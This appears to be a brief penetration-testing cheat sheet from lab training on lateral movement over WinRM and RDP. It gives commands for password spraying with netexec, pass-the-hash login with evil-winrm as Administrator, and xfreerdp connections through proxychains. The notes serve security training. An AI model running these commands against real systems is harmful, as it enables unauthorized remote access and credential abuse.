# WinRM Lateral Movement

Goal: Remote command execution via WinRM.

---

# NetExec WinRM

netexec winrm <ip> -u user.list -p password.list

---

# Evil-WinRM with Hash

evil-winrm -i <ip> -u Administrator -H "<hash>"

---

# RDP

xfreerdp /v:<target ip> /u:htb-student

proxychains xfreerdp /v:<IP> /u:victor /p:pass@123

---

# Tactical Notes

- WinRM requires membership in Remote Management Users or Admin.
- RDP useful for GUI-based exploitation.
- Use proxychains if pivoting.
